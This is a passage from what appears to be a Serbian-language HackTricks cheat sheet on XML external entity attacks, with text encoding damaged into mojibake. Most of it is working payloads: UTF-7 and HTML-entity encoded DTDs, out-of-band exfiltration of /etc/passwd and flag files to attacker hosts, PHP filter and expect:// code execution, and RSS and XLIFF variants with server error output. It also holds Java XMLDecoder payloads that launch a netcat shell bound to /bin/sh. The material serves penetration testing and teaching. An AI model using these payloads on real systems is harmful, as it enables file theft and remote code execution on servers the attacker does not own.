+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

Ako web koristi PHP, umesto `file:/` moÅ¾ete koristiti **php wrappers**`php://filter/convert.base64-encode/resource=` da **pristupite internim datotekama**.

Ako web koristi Javu, moÅ¾ete proveriti [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Trik sa [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
MoÅ¾ete kreirati **entitet unutar entiteta** kodirajuÄ‡i ga sa **html entitetima** i zatim ga pozvati da **uÄita dtd**.\
Napomena da **HTML Entities** koje se koriste moraju biti **numeriÄke** (kao \[u ovom primeru]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Izvuci** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Izvuci spoljnji resurs**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**Ako je PHP "expect" modul uÄitan**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ovaj primer je inspirisan u [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se koristi za standardizaciju razmene podataka u procesima lokalizacije. To je format zasnovan na XML-u koji se prvenstveno koristi za prenos lokalizovanih podataka meÄ‘u alatima tokom lokalizacije i kao zajedniÄki format razmene za CAT (Computer-Aided Translation) alate.

### Blind Request Analysis

Zahtev se Å¡alje serveru sa sledeÄ‡im sadrÅ¾ajem:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
MeÄ‘utim, ovaj zahtev izaziva greÅ¡ku na internom serveru, posebno pominjuÄ‡i problem sa deklaracijama markup-a:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
I pored greÅ¡ke, zabeleÅ¾en je hit na Burp Collaborator, Å¡to ukazuje na odreÄ‘eni nivo interakcije sa spoljnim entitetom.

Out of Band Data Exfiltration Da bi se exfiltrirali podaci, Å¡alje se modifikovani zahtev:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ovaj pristup otkriva da User Agent ukazuje na koriÅ¡Ä‡enje Jave 1.8. ZapaÅ¾eno ograniÄenje ove verzije Jave je nemoguÄ‡nost preuzimanja datoteka koje sadrÅ¾e karakter novog reda, kao Å¡to je /etc/passwd, koristeÄ‡i Out of Band tehniku.

IzvlaÄenje podataka zasnovano na greÅ¡ci Da bi se prevaziÅ¡lo ovo ograniÄenje, koristi se pristup zasnovan na greÅ¡ci. DTD datoteka je strukturirana na sledeÄ‡i naÄin da izazove greÅ¡ku koja ukljuÄuje podatke iz ciljne datoteke:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Server odgovara greÅ¡kom, Å¡to je vaÅ¾no jer odraÅ¾ava nepostojeÄ‡i fajl, ukazujuÄ‡i da server pokuÅ¡ava da pristupi navedenom fajlu:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Da bi se sadrÅ¾aj datoteke ukljuÄio u poruku o greÅ¡ci, DTD datoteka se prilagoÄ‘ava:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ova modifikacija dovodi do uspeÅ¡ne eksfiltracije sadrÅ¾aja datoteke, jer se odraÅ¾ava u izlazu greÅ¡ke poslatom putem HTTP-a. To ukazuje na uspeÅ¡an XXE (XML Eksterna Entitet) napad, koristeÄ‡i kako Out of Band tako i Error-Based tehnike za ekstrakciju osetljivih informacija.

## RSS - XEE

Validan XML u RSS formatu za iskoriÅ¡Ä‡avanje XXE ranjivosti.

### Ping back

Jednostavan HTTP zahtev ka serveru napadaÄa
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ÄŒitaj fajl
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ÄŒitanje izvornog koda

KoriÅ¡Ä‡enje PHP base64 filtera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder je Java klasa koja kreira objekte na osnovu XML poruke. Ako zlonameran korisnik moÅ¾e da natera aplikaciju da koristi proizvoljne podatke u pozivu metodi **readObject**, odmah Ä‡e dobiti izvrÅ¡enje koda na serveru.

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Alati

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Reference

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Izvuci informacije putem HTTP koristeÄ‡i svoj spoljaÅ¡nji DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
UÄi i veÅ¾baj AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄi i veÅ¾baj GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proveri [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾i se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **prati** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podeli hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
